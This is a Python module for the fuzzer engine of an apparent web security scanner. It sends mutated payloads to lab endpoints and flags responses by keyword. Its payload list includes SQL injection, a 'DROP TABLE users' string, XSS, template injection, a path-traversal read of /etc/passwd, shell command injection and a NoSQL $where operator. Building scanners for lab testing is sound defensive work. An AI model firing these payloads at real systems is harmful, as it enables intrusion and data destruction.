"""Fuzzer engine — URL/param mutation + dictionary vs lab, dedup findings."""

from __future__ import annotations

import itertools
import json
import os
import time
import urllib.parse

from webbreach.engines import BaseEngine
from webbreach.findings import Finding, ScanResult, Severity


FIXTURES_DIR = os.path.join(os.path.dirname(__file__), "fixtures")
WORDLIST = os.path.join(FIXTURES_DIR, "wordlist.txt")


class FuzzerEngine(BaseEngine):
    name = "fuzzer"
    description = "URL/param mutation fuzzer with dictionary payloads"

    # Endpoints to fuzz
    FUZZ_TARGETS = [
        ("/sqli", "id", "GET"),
        ("/sqli_post", "name", "POST"),
        ("/xss", "q", "GET"),
        ("/ssti", "name", "GET"),
        ("/cmd", "host", "GET"),
        ("/nosql", "query", "POST"),
        ("/traversal", "file", "POST"),
    ]

    # Mutation strategies
    STRATEGIES = [
        "' OR 1=1--",
        "admin'--",
        "{{7*7}}",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "; echo FUZZ_MARKER",
        "0; DROP TABLE users--",
        '["admin"]',
        '{"$where":"1==1"}',
    ]

    def _load_wordlist(self) -> list[str]:
        words = []
        if os.path.exists(WORDLIST):
            with open(WORDLIST) as f:
                words = [line.strip() for line in f if line.strip()]
        return words or self.STRATEGIES

    def _scan(self) -> list[Finding]:
        findings: list[Finding] = []
        seen: set[str] = set()
        words = self._load_wordlist()

        for path, param, method in self.FUZZ_TARGETS:
            for word in itertools.islice(words, 10):  # limit per endpoint
                key = f"{path}|{param}|{word}"
                if key in seen:
                    continue
                seen.add(key)

                try:
                    if method == "GET":
                        url = f"{self.target_url}{path}?{param}={urllib.parse.quote(word)}"
                        status, body, _ = self._get(url)
                    else:
                        if param == "query":
                            data = json.dumps({"query": {"$where": f"this.name=='{word}'"}})
                        else:
                            data = json.dumps({param: word})
                        url = f"{self.target_url}{path}"
                        status, body, _ = self._post(url, data, content_type="application/json")

                    # Heuristic: error messages or unusual content = potential finding
                    lower = body.lower()
                    indicators = ["sql", "syntax", "error", "admin", "secret",
                                  "49", "top_secret", "FUZZ_MARKER", "script"]
                    for ind in indicators:
                        if ind.lower() in lower and f"webbreach_fuzz_{key}" not in body:
                            findings.append(self._finding(
                                severity=Severity.MEDIUM,
                                title=f"Fuzzer hit: {ind} in {path}",
                                param=param,
                                method=method,
                                evidence=body[:200],
                                payload=word,
                            ))
                            break
                except Exception:
                    continue

        return findings


# Also make fuzz fixtures importable for tests
FIXTURES_DIR_MODULE = FIXTURES_DIR
